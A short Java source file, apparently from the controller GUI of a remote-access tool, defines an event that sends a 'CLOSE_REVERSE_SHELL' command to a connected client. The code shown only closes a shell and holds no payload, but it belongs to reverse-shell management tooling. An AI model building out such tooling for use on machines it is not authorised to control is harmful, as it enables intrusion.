package TableUtils.ReverseShell.Events;

import TableUtils.ReverseShell.ReverseShellGUI;
import Utilities.AbstractEventGUI;
import org.json.JSONObject;

import java.io.IOException;

public class CloseShellEvent extends AbstractEventGUI<ReverseShellGUI> {
    public CloseShellEvent(ReverseShellGUI guiManager) {
        super(guiManager);
    }

    @Override
    public void run() {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", "CLOSE_REVERSE_SHELL");
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            handleGuiError();
        }
    }
}
